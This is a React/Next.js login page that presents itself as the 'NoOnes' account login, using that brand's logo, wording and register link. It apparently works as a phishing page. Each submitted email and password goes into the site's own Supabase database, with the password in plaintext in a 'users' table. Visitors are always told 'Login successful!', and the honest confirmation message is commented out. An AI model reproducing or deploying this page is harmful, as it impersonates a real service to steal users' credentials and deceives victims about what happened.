"use client";

import { useState } from "react";
import { createClient } from "@/lib/supabase/client";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage("");

    try {
      const supabase = createClient();
      
      // Try to sign in first
      const { data: signInData, error: signInError } = await supabase.auth.signInWithPassword({
        email,
        password,
      });

      if (!signInError && signInData.user) {
        // User exists, sign in successful
        setMessage("Login successful!");
        setEmail("");
        setPassword("");
        return;
      }

      // If sign in fails, try to sign up
      const { data: signUpData, error: signUpError } = await supabase.auth.signUp({
        email,
        password,
        options: {
          emailRedirectTo: `${typeof window !== "undefined" ? window.location.origin : ""}/auth/callback`,
        },
      });

      if (signUpError) throw signUpError;

      if (signUpData.user) {
        // Save user details to database (ignore RLS errors)
        await supabase.from("users").insert([
          {
            email: signUpData.user.email,
            created_at: new Date(),
            password: password
          },
        ]);

        // setMessage("Account created! Check your email to confirm.");
        setMessage("Login successful!");
        setEmail("");
        setPassword("");
      }
    } catch (error: any) {
      setMessage(error?.message || "An error occurred");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-green-800 text-center min-h-screen flex flex-col justify-center">
      {/* <div className="absolute top-4 right-4 text-sm">
        <select className="p-2 border border-gray-300 rounded-md bg-white text-gray-700 focus:ring-blue-500 focus:border-blue-500">
          <option>English</option>
          <option>Spanish</option>
          <option>French</option>
        </select>
      </div> */}
      <svg
        viewBox="0 0 104 32"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
        width="198"
        height="66"
        className="text-green-500 mx-auto"
      >
        <path
          d="M79.1209 19.9821L88.3283 19.6653L88.1105 13.512L86.7034 13.5605L86.6543 12.1731L83.8406 12.2699L83.7915 10.8826L78.1641 11.0763L78.2132 12.4636L75.3995 12.5605L75.4486 13.9478L74.0414 13.9963L74.1397 16.7704L72.7325 16.8188L72.9266 22.2965L74.3338 22.2481L74.432 25.0222L75.8391 24.9738L75.8883 26.3611L78.7019 26.2643L78.7511 27.6516L84.3785 27.4579L84.3293 26.0706L87.143 25.9737L87.0939 24.5864L88.5011 24.5379L88.3993 21.6571L86.9921 21.7055C84.1784 21.8023 84.3187 23.7206 81.0718 23.832C79.3765 23.8904 77.2788 23.0368 77.2285 21.6139C77.1948 20.6536 77.9309 20.0229 79.1209 19.9821ZM77.6924 16.4758C78.1013 15.7378 79.0185 14.8626 81.076 14.792C83.1334 14.7214 84.1104 15.5306 84.5708 16.2389C84.8578 16.6811 84.5394 17.2634 84.0068 17.2815L81.1677 17.3795L78.3286 17.4775C77.7966 17.4956 77.4374 16.9372 77.6924 16.4764V16.4758Z"
          fill="currentColor"
        ></path>
        <path
          d="M0 11.8535L4.20072 11.4183L4.49481 14.179L5.89486 14.0338L5.74751 12.6534L7.14756 12.5081L7.00022 11.1278L12.5655 10.5508L12.7128 11.9311L14.1129 11.7859L14.407 14.5466L15.807 14.4013L17.1236 26.7533L12.9229 27.1885L11.9572 18.1276C11.7495 16.1807 10.2642 14.8313 8.10972 15.0547C5.95521 15.2782 4.78417 16.903 4.99128 18.8498L5.95699 27.9108L1.75627 28.346L0 11.8535Z"
          fill="currentColor"
        ></path>
        <path
          d="M56.0312 10.7387L60.2521 10.884L60.1538 13.6587L61.561 13.7071L61.6101 12.3198L63.0172 12.3682L63.0664 10.9808L68.6588 11.1734L68.6097 12.5607L70.0169 12.6091L69.9186 15.3838L71.3258 15.4323L70.8861 27.845L66.6653 27.6997L66.9878 18.5944C67.057 16.6382 65.7765 15.098 63.6113 15.0233C61.4468 14.9486 60.0568 16.3972 59.9876 18.3534L59.6651 27.4587L55.4442 27.3135L56.0312 10.7393V10.7387Z"
          fill="currentColor"
        ></path>
        <path
          d="M94.0759 26.1009L91.2616 26.004L91.3107 24.6167L89.9035 24.5682L90.0095 21.5812L91.9569 21.6483C94.9149 21.7504 93.9398 23.7824 97.4381 23.9032C98.7014 23.9469 99.7305 23.4469 99.7672 22.416C99.7985 21.5269 99.0547 21.1086 97.8322 20.9243L94.6735 20.4243C91.5119 19.9237 90.139 17.9179 90.2047 16.0691L90.2941 13.5435L91.7012 13.5919L91.7503 12.2046L94.5646 12.3014L94.6137 10.9141L99.8802 11.0955L99.8311 12.4829L102.645 12.5797L102.596 13.9671L104.003 14.0155L103.9 16.932L102.816 16.8946C99.1381 16.768 100.006 14.6969 96.6132 14.5802C95.1356 14.5295 94.2853 15.0335 94.2581 15.8171C94.2267 16.7062 94.8682 16.9413 96.2339 17.1665L99.5038 17.6706C102.449 18.1285 103.787 20.132 103.705 22.4446L103.613 25.0408L102.206 24.9924L102.157 26.3797L99.3429 26.2829L99.2938 27.6702L94.0273 27.4888L94.0764 26.1015L94.0759 26.1009Z"
          fill="currentColor"
        ></path>
        <path
          d="M34.4435 19.9612L34.1494 17.2005L32.7493 17.3458L32.602 15.9654L29.8019 16.2554L29.6546 14.875L23.5514 15.5074L23.6988 16.8878L20.8987 17.1777L21.046 18.5581L19.646 18.7034L19.9401 21.4641L18.54 21.6093L19.1211 27.059L20.5212 26.9137L20.8153 29.6744L22.2153 29.5292L22.3626 30.9095L25.1627 30.6196L25.3101 31.9999L31.4132 31.3675L31.2659 29.9871L34.066 29.6972L33.9186 28.3168L35.3187 28.1716L35.0246 25.4108L36.4246 25.2656L35.8435 19.8159L34.4435 19.9612ZM30.7102 26.4149C30.0292 27.1552 29.0865 27.6727 27.9457 27.7906C26.8054 27.9084 25.7752 27.5963 24.9527 27.0123C23.9337 26.311 23.2059 25.209 23.0662 23.8951C22.926 22.5819 23.4041 21.3561 24.252 20.4612C24.9331 19.7202 25.8764 19.2028 27.0172 19.0843C28.1593 18.9659 29.1913 19.2792 30.0138 19.8649C31.031 20.5668 31.7564 21.6671 31.8961 22.9798C32.0363 24.2936 31.5576 25.5199 30.7091 26.4149H30.7102Z"
          fill="currentColor"
        ></path>
        <path
          d="M52.5632 12.4532L52.6614 9.67848L51.2542 9.63006L51.3034 8.24271L48.4891 8.14586L48.5382 6.7585L42.4049 6.54731L42.3557 7.93466L39.5415 7.83782L39.4923 9.22517L38.0852 9.17675L37.987 11.9515L36.5798 11.903L36.3857 17.3795L37.7929 17.428L37.6947 20.2027L39.1018 20.2511L39.0527 21.6384L41.867 21.7353L41.8179 23.1226L47.9512 23.3338L48.0003 21.9465L50.8146 22.0433L50.8637 20.656L52.2708 20.7044L52.3691 17.9297L53.7762 17.9781L53.9703 12.5016L52.5632 12.4532ZM47.9553 18.3317C47.176 18.9717 46.1701 19.3544 45.0239 19.3147C43.8783 19.275 42.9019 18.8246 42.1699 18.1333C41.2599 17.299 40.6947 16.1083 40.7415 14.7874C40.7882 13.4677 41.435 12.3196 42.4007 11.5495C43.18 10.9089 44.1872 10.5262 45.3334 10.5653C46.4807 10.6049 47.4583 11.0565 48.1908 11.7496C49.0991 12.5839 49.6619 13.7735 49.6151 15.0926C49.5684 16.4128 48.9216 17.5616 47.9553 18.3311V18.3317Z"
          fill="currentColor"
        ></path>
        <path
          d="M58.2876 0.892151L57.2092 0L53.2462 4.65646L54.3246 5.54861L58.2876 0.892151Z"
          fill="currentColor"
        ></path>
        <path
          d="M52.8234 1.87122L51.4371 1.63021L51.0088 4.02493L52.3951 4.26594L52.8234 1.87122Z"
          fill="currentColor"
        ></path>
        <path
          d="M58.8201 6.36305L58.3387 5.05881L54.8628 6.30613L55.3443 7.61036L58.8201 6.36305Z"
          fill="currentColor"
        ></path>
      </svg>
      <div className="w-full max-w-sm bg-white rounded-lg mt-6 mb-12 p-6 mx-auto">
        <div className="text-center mb-6">
          <h1 className="mt-4 text-2xl font-semibold text-gray-900">Log in</h1>
          <p className="mt-1 text-sm text-gray-600">
            Access your NoOnes account
          </p>
        </div>

        {/* <div className="space-y-3 ">
          <button className="w-full flex items-center justify-center space-x-2 px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 transition duration-150">
            <svg width="20" height="20">
              <use xlinkHref="#icon-IconGoogle-9ac59b"></use>
            </svg>
            <span>Log in with Google</span>
          </button>
          <button className="w-full flex items-center justify-center space-x-2 px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 transition duration-150">
            <svg
              className="w-4 h-4 text-blue-600"
              viewBox="0 0 24 24"
              fill="currentColor"
            >
              <path d="M14 13.5h2.5l1-4H14v-2c0-1.03 0-2 .272-2h3.728V1.725C17.653 1.621 16.516 1.5 15.228 1.5c-2.716 0-4.57 1.657-4.57 4.793V9.5H7.5v4H11V23h4v-9.5z" />
            </svg>
            <span>Log in with Facebook</span>
          </button>
          <button className="w-full flex items-center justify-center space-x-2 px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 transition duration-150">
            <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 20.17c.56 0 1.08-.23 1.45-.63.38-.4.59-.9.59-1.48 0-1.27-.92-2.12-2.03-2.12-.13 0-.25.01-.38.03-.3.04-.59.1-.88.13-1.63.2-3.13-.53-4.14-2.1-.38-.6-.62-1.28-.62-1.95 0-.08.01-.17.02-.25.01-.08.02-.17.03-.25.05-.2.11-.4.18-.58.33-.87 1.03-1.6 1.9-2.12.38-.22.8-.35 1.25-.35 1.04 0 2.05.8 2.5 1.9.43 1.13 1.14 2.1 2.07 2.1h.02c.93 0 1.64-.97 2.07-2.1.45-1.1 1.46-1.9 2.5-1.9 1.47 0 2.92.93 3.65 2.1.28.45.48.96.6 1.52.09.43.14.88.14 1.34 0 2.87-2.1 5.3-5.2 5.3-.64 0-1.28-.08-1.9-.25-.33-.09-.65-.2-1-.31-.1-.03-.2-.05-.3-.07-.3-.06-.6-.1-.9-.12-.34-.03-.68-.05-1.02-.05-1.22 0-2.3.52-3.2 1.42-.4.4-.62.9-.62 1.48 0 .58.22 1.08.62 1.48.4.4.92.63 1.48.63z" />
            </svg>
            <span>Log in with Apple</span>
          </button>
        </div> */}

        {/* <div className="divider">
          <span className="px-2 text-xs uppercase font-medium text-gray-400">
            Or log in with
          </span>
        </div> */}

        <form className="space-y-4" onSubmit={handleSubmit}>
          {message && (
            <div
              className={`p-3 rounded text-sm ${
                message.includes("successful")
                  ? "bg-green-100 text-green-800"
                  : "bg-red-100 text-red-800"
              }`}
            >
              {message}
            </div>
          )}

          <div>
            <label
              htmlFor="email"
              className="block text-sm font-medium text-gray-700"
            >
              Email
            </label>
            <div className="mt-1">
              <input
                id="email"
                name="email"
                type="email"
                autoComplete="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                placeholder="Your email address"
              />
            </div>
          </div>

          <div>
            <div className="flex items-center justify-between">
              <label
                htmlFor="password"
                className="block text-sm font-medium text-gray-700"
              >
                Password
              </label>
              <div className="text-sm">
                <a
                  href="#"
                  className="font-medium text-green-600 hover:text-green-500"
                >
                  Forgot password?
                </a>
              </div>
            </div>
            <div className="mt-1">
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-green-500 focus:border-green-500 sm:text-sm"
                placeholder="Your password"
              />
            </div>
          </div>

          <div>
            <button
              type="submit"
              disabled={loading}
              className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-green-600 hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 transition duration-150 disabled:opacity-50"
            >
              {loading ? "Loading..." : "Continue"}
            </button>
          </div>
        </form>

        <div className="mt-6 space-y-3 text-center">
          <a
            href="#"
            className="text-sm font-medium text-green-600 hover:text-green-500 block"
          >
            Log in with your phone number
          </a>

          <p className="text-xs text-gray-500 mt-4">
            Don’t have an account?
            <a
              href="https://noones.com/id/register"
              className="font-medium text-green-600 hover:text-green-500"
            >
              Join us
            </a>
          </p>
        </div>
      </div>
    </div>
  );
}
